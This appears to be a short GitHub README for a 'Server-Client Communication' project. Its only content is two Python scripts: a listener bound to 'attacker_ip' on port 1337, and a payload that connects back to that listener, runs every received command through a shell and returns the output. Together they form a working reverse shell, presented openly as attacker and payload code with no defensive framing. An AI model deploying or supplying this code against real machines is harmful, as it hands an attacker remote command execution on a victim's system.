<h2 align="center">Server-Client Communication</h2>
<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>

- - - - - - - - - - - - - - - - - - - - - -
> [listener.py](listener.py)
```python
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()
print(f"Connected to {address}")

while True:
	## continuously send commands to be executed in client machine
	cmd = input("enter a command: ") # string input	
	connection.send(bytes(cmd, "utf-8")) # typecasted and converted into bytes
	
	output = connection.recv(2048) # receive the output from client machine
	print(output.decode("utf-8")) # display decoded bytes into string
```
---
> [payload.py](payload.py)
```python
import socket
import subprocess

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

while True:
	## continuously receive command data
	cmd = payload.recv(2048) # 1024 is approximately 1K bytes, 2048 is 2K bytes of data
	cmd = cmd.decode("utf-8") # decode bytes into string
	output = subprocess.check_output(cmd, shell = True) # store output in a variable
	payload.send(output) # output should be sent back to server machine
```